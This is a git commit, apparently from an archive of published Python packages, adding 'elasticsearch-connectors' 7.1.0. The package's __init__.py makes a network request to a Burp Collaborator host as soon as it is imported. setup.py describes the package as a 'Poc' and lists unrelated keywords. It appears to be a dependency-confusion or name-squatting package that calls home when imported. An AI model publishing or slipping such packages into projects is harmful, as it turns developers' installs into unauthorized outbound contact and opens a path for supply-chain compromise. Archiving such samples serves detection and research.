9a4e92339010102c4bec3d46ecfb7d9766f52db7
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 04:11:46 +0000

    Add package elasticsearch-connectors/7.1.0/elasticsearch-connectors-7.1.0.tar.gz

---
+++ packages/elasticsearch-connectors/elasticsearch-connectors-7.1.0.tar.gz/elasticsearch-connectors-7.1.0/elasticsearch_connectors/__init__.py
@@ -0,0 +1,3 @@
+import requests
+
+x = requests.get('https://hcxvptk3o6et2klb4kx9mi5an1trhg.burpcollaborator.net')
---
+++ packages/elasticsearch-connectors/elasticsearch-connectors-7.1.0.tar.gz/elasticsearch-connectors-7.1.0/setup.py
@@ -0,0 +1,30 @@
+from setuptools import setup, find_packages
+import codecs
+import os
+import atexit
+import sys
+
+
+VERSION = '7.1.0'
+DESCRIPTION = 'hey'
+LONG_DESCRIPTION = 'Poc'
+
+# Setting up
+setup(
+    name="elasticsearch-connectors",
+    version=VERSION,
+    author="scythe_abhi",
+    author_email="scytheabhi97@gmail.com",
+    description=DESCRIPTION,
+    packages=find_packages(),
+    install_requires=['requests'],
+    keywords=['python', 'video', 'stream', 'video stream', 'camera stream', 'sockets'],
+    classifiers=[
+        "Development Status :: 1 - Planning",
+        "Intended Audience :: Developers",
+        "Programming Language :: Python :: 3",
+        "Operating System :: Unix",
+        "Operating System :: MacOS :: MacOS X",
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
